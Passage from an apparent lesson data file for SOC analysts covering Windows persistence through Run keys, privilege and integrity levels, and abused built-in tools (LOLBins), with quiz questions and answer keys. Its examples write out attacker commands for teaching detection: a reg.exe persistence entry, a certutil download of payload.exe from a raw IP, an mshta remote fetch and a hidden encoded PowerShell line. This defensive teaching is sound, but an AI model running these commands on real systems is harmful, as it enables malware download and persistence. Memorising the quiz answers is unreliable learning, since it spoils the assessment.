        "codeExample": "// A Run-key value that launches malware at every user logon (persistence).\n// Registry path (note: HKCU = current user, so it runs when jsmith logs in):\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    ValueName: \"OneDriveSync\"\n    ValueData: \"C:\\Users\\jsmith\\AppData\\Roaming\\odsync.exe\"\n\n// Why it's suspicious:\n//   - Name \"OneDriveSync\" imitates a legit product to blend in\n//   - But the real OneDrive does NOT live in AppData\\Roaming\\odsync.exe\n//   - The file is unsigned and sits in a user-writable folder\n\n// The command an attacker might use to create it:\nreg.exe add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v OneDriveSync /t REG_SZ \\\n  /d \"C:\\Users\\jsmith\\AppData\\Roaming\\odsync.exe\" /f\n\n// Analyst questions: What does it launch, is it signed, is the path normal?\n// When was it written, and which process wrote it? Is it new to this host?"
      },
      {
        "heading": "Accounts, Privileges, and Integrity Levels",
        "content": "Windows decides what any action is allowed to do based on *who* is doing it and *how much power* they have. Understanding accounts and privileges tells you whether a given action was even *possible* for the account involved — and whether an attacker has managed to increase their power, a step called **privilege escalation** that is central to almost every serious intrusion.\n\n### Local vs domain accounts\n\nA **local account** exists only on one computer; it is defined on that machine and means nothing anywhere else. A **domain account** is managed centrally by Active Directory (the company's directory service) and can log in to many machines across the organization. The distinction matters enormously in an investigation: a local account compromise is contained to one host, while a domain account compromise can spread across the whole environment. When you see an account name, one of your first questions is: is this local to this box, or a domain account with reach?\n\n### Admin vs standard\n\nAccounts also differ in power. A **standard user** can run their own programs and change their own settings but cannot alter the system or affect other users. An **administrator** can do almost anything: install software, change security settings, access other users' data, create services. Attackers desperately want administrator rights because standard-user access is limiting. A huge amount of attacker effort goes into moving from a standard account to an administrative one. When you see an administrative action, ask whether the account performing it *should* have had that power.\n\n### Integrity levels\n\nWindows adds another layer called the **integrity level**, which is a trust ranking attached to a process. The main levels are **Low**, **Medium**, **High**, and **System**. A normal user's programs run at Medium. When a program runs \"as administrator,\" it runs at High. Integrity levels help explain a common attacker move: a process may start at Medium and then, through an exploit or a trick, obtain a High-integrity process. That jump from Medium to High is privilege escalation in action, and spotting it in telemetry is valuable.\n\n### SYSTEM: the most powerful account\n\nAbove even administrators sits **SYSTEM** (sometimes written NT AUTHORITY\\SYSTEM), a built-in account Windows itself uses to run its core components. SYSTEM has essentially unlimited power on the machine — more than any human administrator's normal session. This is exactly why attackers aim for it. If they can get their code running as SYSTEM, they own the machine completely. Many services run as SYSTEM, which is one reason attackers target services: hijack a SYSTEM service and your malware inherits SYSTEM power.\n\n### The questions a good analyst asks\n\nFor any noteworthy action ask: **Which account did this, and is it local or domain?** **What privilege level and integrity level was it running at, and does the action fit that level?** A standard user suddenly performing an administrative action means either a legitimate elevation or an escalation you need to explain. Ask: **Did anything just run as SYSTEM that should not have?** A user-launched program that somehow ends up running as SYSTEM is a screaming indicator of escalation. Understanding accounts and privileges turns a confusing event into a clear question: was this action within this account's rightful power, or did someone reach beyond it?",
        "codeExample": "// Reading account and privilege context from process telemetry.\n\n// A) Normal: a standard user's app at Medium integrity\nUser:            CORP\\jsmith\nProcess:         C:\\Program Files\\Google\\Chrome\\chrome.exe\nIntegrityLevel:  Medium         // expected for a standard user's program\n\n// B) Suspicious: a user-spawned process now running as SYSTEM\nUser:            NT AUTHORITY\\SYSTEM      // highest power on the machine\nProcess:         C:\\Users\\jsmith\\AppData\\Local\\Temp\\a.exe   // ...from a user temp folder?\nParentImage:     C:\\Windows\\System32\\services.exe\nIntegrityLevel:  System\n// A binary in a USER temp folder running as SYSTEM is a classic privilege-escalation\n// / SYSTEM-service-abuse signal. SYSTEM code should not live in a user's Temp directory.\n\n// Analyst questions: local or domain account? What integrity level, and does the\n// action fit it? Did anything reach SYSTEM that had no business getting there?"
      },
      {
        "heading": "What Normal Looks Like — and the LOLBins That Break It",
        "content": "The hardest part of Windows defense is not spotting obviously evil malware — it is spotting evil done with *legitimate tools*. Attackers have learned that bringing their own hacking software is risky because antivirus flags it. So instead they \"live off the land\": they use the trusted programs already built into Windows to do their dirty work. These abused built-in programs are called **LOLBins** (Living-Off-the-Land Binaries), and they are the reason a good analyst spends so much energy understanding what *normal* looks like.\n\n### Why LOLBins are so hard\n\nA LOLBin is a program that ships with Windows, is signed by Microsoft, and has a genuine legitimate purpose — yet can be repurposed for malicious ends. Because the program is trusted and present on every machine, using it draws far less attention than dropping a new executable. The challenge is that the same program name appears in both benign and malicious activity; you cannot simply blocklist it. You have to judge *how* it is being used. That judgment is the essence of the skill.\n\n### The LOLBins you will meet most\n\n**certutil.exe** is meant for managing certificates. But it can also download files from the internet and decode encoded data — so attackers use it to fetch malware while looking like a routine certificate operation. **rundll32.exe** legitimately runs code inside library (.dll) files, a normal Windows mechanism; attackers use it to execute malicious DLLs and to launch code in a way that hides the real payload. **mshta.exe** runs HTML application files and is almost never needed in modern environments; attackers use it to execute malicious scripts pulled from a web address. **powershell.exe** is a powerful, legitimate automation tool that is also the single most abused LOLBin — used to download, decode, and run malware entirely in memory, especially with hidden windows and encoded commands.\n\nOther names worth knowing include wmic.exe, regsvr32.exe, bitsadmin.exe, and cmd.exe. The list grows over time, but the pattern is constant: trusted tool, untrusted use.\n\n### Building a sense of normal\n\nYou cannot recognize abnormal until you know normal. On a typical workstation, certutil rarely runs at all; when it does, it is usually a scripted admin action, not a download from a random address. rundll32 runs constantly — but launched by Windows itself, loading known system DLLs, not a DLL from a temp folder. powershell runs for IT automation, usually launched by known parents, not by Word or with a hidden, encoded command line. The abnormal cases share tells: an unusual *parent*, an unusual *file path*, a *network connection* to an external address, or a command line full of encoding and obfuscation.\n\n### The questions a good analyst asks\n\nFor any LOLBin, do not ask \"is this program bad?\" — it is a trusted program, so the answer is always \"it depends.\" Instead ask: **Who launched it?** certutil spawned by winword.exe is very different from certutil run by an admin script. **What is the full command line?** Does it contain a URL, an encoded blob, a download instruction, a hidden-window flag? **Did it make a network connection or write a new file?** A certificate tool that just downloaded an executable is not doing certificate work. **Is this normal on this host for this user?** A finance workstation running mshta to fetch a remote script is not doing anyone's job. The mental shift — from \"is the tool bad\" to \"is this *use* of the tool normal\" — is what separates an analyst who catches living-off-the-land attacks from one who waves them through because the program was signed by Microsoft.",
        "codeExample": "// LOLBins: trusted Microsoft-signed tools used for untrusted purposes.\n// The program name alone is innocent — judge the COMMAND LINE and CONTEXT.\n\n// certutil.exe abused as a downloader (its real job is certificates, not this):\ncertutil.exe -urlcache -split -f http://185.99.4.12/payload.exe C:\\Users\\Public\\p.exe\n//  -> a certificate tool fetching an .exe from a raw IP = not certificate work\n\n// mshta.exe abused to run a remote script (finance workstation, no reason to):\nmshta.exe http://cdn-updates[.]info/x.hta\n//  -> pulling and running an HTML application from an external site\n\n// powershell.exe, the most-abused LOLBin, hidden + encoded:\npowershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...\n//  -> hidden window + encoded command = deliberately obscured intent\n\n// The right question is NOT \"is powershell bad?\" (it's trusted) but:\n//   Who launched it? What's the full command line? Did it connect out or drop a file?\n//   Is this normal for THIS host and THIS user? Context decides, not the program name."
      }
    ],
    "keyTakeaways": [
      "A process is a running program with a unique PID and a parent PID; the parent-child chain (like winword.exe spawning powershell.exe) is the analyst's most powerful tell, because it is the relationship — not either program alone — that reveals an attack.",
      "Services, scheduled tasks, and other autostart points let programs run automatically, which is why attackers abuse them for persistence; always ask who created a new one, what it launches, and whether it belongs on that host.",
      "The registry is Windows' central settings database; Run keys (HKCU/HKLM ...\\CurrentVersion\\Run) auto-launch programs at logon, making them a favorite persistence spot — be suspicious of any Run value pointing to an unsigned file in a temp or AppData folder.",
      "Accounts differ by scope (local vs domain) and power (standard vs administrator vs SYSTEM), and processes carry an integrity level (Low/Medium/High/System); a user-launched program running as SYSTEM or jumping to High integrity signals privilege escalation.",
      "LOLBins are trusted, Microsoft-signed built-in tools (certutil, rundll32, mshta, powershell) abused for malicious ends; you cannot blocklist them, so shift the question from 'is this tool bad?' to 'is this USE of the tool normal for this host and user?'"
    ],
    "quiz": [
      {
        "question": "You are a SOC analyst reviewing process telemetry from a Windows workstation and you see that WINWORD.EXE is the parent process of a powershell.exe instance running a hidden, encoded command. Why is this parent-child relationship, rather than either program on its own, the key indicator?",
        "options": [
          {
            "label": "Because powershell.exe is malware and should never run on any machine",
            "value": "a"
          },
          {
            "label": "Because Word and PowerShell are both legitimate, but Word has no normal reason to launch a scripting engine — so the relationship itself is the signature of a malicious document",
            "value": "b"
          },
          {
            "label": "Because WINWORD.EXE is not a real Windows program",
            "value": "c"
          },
          {
            "label": "Because the PID number of PowerShell is always malicious",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Both programs are legitimate in isolation, so evaluating them alone tells you nothing; the tell is that Word launching PowerShell is not a normal pairing, which is the classic maldoc chain (document runs code that spawns PowerShell). Option a is wrong because PowerShell is a trusted, widely used tool — not malware. Option c is false; WINWORD.EXE is genuine Microsoft Word. Option d is nonsense — a PID is just an identifier and carries no verdict."
      },
      {
        "question": "You are a SOC analyst and, moments after a suspicious PowerShell command runs on a host, a new scheduled task named 'SystemUpdateCheck' appears that re-launches a script from the user's Downloads folder at every logon. What attacker goal does this scheduled task most directly serve, and what should you ask about it?",
        "options": [
          {
            "label": "It serves data exfiltration, and you should ask how many bytes it sent",
            "value": "a"
          },
          {
            "label": "It serves persistence, and you should ask who created it, what it actually launches, and whether such a task belongs on this host",
            "value": "b"
          },
          {
            "label": "It serves nothing, because scheduled tasks cannot run malware",
            "value": "c"
          },
          {
            "label": "It serves encryption, because scheduled tasks are how ransomware encrypts files",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "A scheduled task that re-launches a payload at every logon is textbook persistence — it survives reboots and re-starts the malware even if you kill the running process — so the right questions are who created it, what it launches, and whether it belongs there. Option a misreads the mechanism; the task is about restarting the payload, not measuring data transfer. Option c is false — scheduled tasks routinely launch programs, malicious or not. Option d is wrong; scheduled tasks are a persistence mechanism, not an encryption method, and the boring name pointing to a Downloads-folder script is the tell."
      },
      {
        "question": "You are a SOC analyst investigating a Windows host and you find a new value under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run named 'OneDriveSync' pointing to C:\\Users\\jsmith\\AppData\\Roaming\\odsync.exe. Which reasoning best explains why this deserves suspicion?",
        "options": [
          {
            "label": "Any value in the registry is malicious by definition, so all Run keys should be deleted",
            "value": "a"
          },
          {
            "label": "A Run key auto-launches its target at every logon, and this entry imitates a legitimate product name while pointing to an unsigned executable in a user-writable AppData folder rather than the real product's location",
            "value": "b"
          },
          {
            "label": "The registry cannot store program paths, so this entry must be corrupted",
            "value": "c"
          },
          {
            "label": "HKCU means the value affects the whole machine, which is always dangerous",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Run keys cause their target to launch automatically at logon, and this one masquerades as 'OneDriveSync' while pointing to an odd, user-writable path where the real OneDrive does not live — a classic persistence pattern. Option a is wrong because the registry legitimately holds countless normal settings; blanket deletion would break Windows. Option c is false; the registry routinely stores program paths. Option d misstates the hive — HKCU applies to the current user, not the whole machine (that would be HKLM) — and it is the imitation-plus-odd-path combination, not the hive alone, that raises the flag."
      },
      {
        "question": "You are a SOC analyst and an alert fires because certutil.exe on a finance workstation ran with a command line that downloaded an executable from a raw IP address. A junior colleague says certutil is a signed Microsoft tool so it must be safe. What is the correct way to reason about this LOLBin?",
        "options": [
          {
            "label": "The colleague is right; because certutil is Microsoft-signed, no certutil activity ever needs investigation",
            "value": "a"
          },
          {
            "label": "The question is not whether the tool is bad but whether this USE is normal — certutil's job is certificates, so using it to download an executable from a raw IP is abuse regardless of the signature; check who launched it, the full command line, and whether it connected out or dropped a file",
            "value": "b"
          },
          {
            "label": "You should immediately blocklist certutil.exe across the entire company",
            "value": "c"
          },
          {
            "label": "The signature proves it downloaded a safe file, so no further action is needed",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "certutil is a trusted, signed built-in tool, so the signature says nothing about intent; the LOLBin mindset is to judge the use, and a certificate utility fetching an executable from a raw IP is out of character and warrants checking the parent, command line, and any network or file activity. Option a is dangerously wrong — being signed is exactly why attackers pick LOLBins. Option c is impractical because certutil has legitimate uses and blocklisting it would break real workflows; you judge behavior, not the binary. Option d confuses a code signature on the tool with any guarantee about the file it downloaded, which there is none."
      }
    ],
    "references": [
      "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
      "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-run-keys",
      "https://attack.mitre.org/tactics/TA0003/",
      "https://lolbas-project.github.io/",
      "https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers"
    ],
    "xp": 160,
    "estimatedMinutes": 36,
    "createdAt": "2026-07-04T00:00:00.000Z",
    "researchUsed": false
  },
];
export default lessons;
